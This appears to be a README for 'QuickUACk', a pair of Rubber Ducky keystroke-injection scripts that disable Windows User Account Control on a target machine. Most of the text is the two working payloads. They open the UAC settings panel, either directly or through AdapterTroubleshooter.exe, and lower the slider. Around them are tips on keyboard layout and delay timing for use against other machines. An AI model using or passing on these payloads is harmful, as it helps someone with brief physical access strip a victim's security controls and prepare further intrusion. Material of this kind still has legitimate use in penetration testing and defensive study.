# QuickUACk!
Some of my antiUAC Scripts for Rubbber Ducky

A pair of fast solutions to disable UAC (User Account Control) 
</BR>
it works on all windows version 32 and 64 bits with uac (Vista or Earlier) 
</BR>
and are valid for all languages (Latin, of course).
</BR>

The scripts were created with the Italian keyboard, 
</BR>
so I do not exclude that in some cases they require minor adjustments.
</BR>
if the target machine is old, I recommend extending the delay time.

</BR>

![alt text](https://media1.giphy.com/media/aQrYT4WVN55aU/giphy.gif)


</BR>


Ver 1.0 uses a .exe application from the C: \ Windows \ System32 (system protected) folder, 
</BR>
to start the uac on-screen control and switch to the uac panel.
</BR>
the C: \ Windows \ SysWOW64 folder for the purpose or other protected system folders that contain exe are also fine.
</BR>
Several applications contained in System32 are good, but be careful because there are some exceptions.
</BR>
You can consult this list to see the applications that are whitelisted by default and therefore 
</BR>
do not require uac checking to be performed.
</BR>

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

QuickUACk Ver. 1.0

DELAY 2000
</BR>
CTRL ESC
</BR>
DELAY 200
</BR>
REM start C:\Windows\System32\AdapterTroubleshooter.exe
</BR>
REM work on all windows version 32 and 64 bit
</BR>
REM no reboot is required for disabling 
</BR>
STRING AdapterTroubleshooter
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
TAB
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DELAY 200
</BR>
TAB
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
LEFTARROW
</BR>
DELAY 200
</BR>
ENTER
</BR>

-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-



QuickUACk Ver. 2.0

DELAY 2000
</BR>
CTRL ESC
</BR>
DELAY 200
</BR>
REM opens directly the User Account Control Panel 
</BR>
REM work on all windows version 32 and 64 bit with uac (Vista or Earlier)
</BR>
REM no reboot is required for disabling
</BR>
STRING UAC
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
LEFTARROW
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DELAY 200
</BR>
TAB
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
LEFTARROW
</BR>
DELAY 200
</BR>
ENTER

</BR>

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
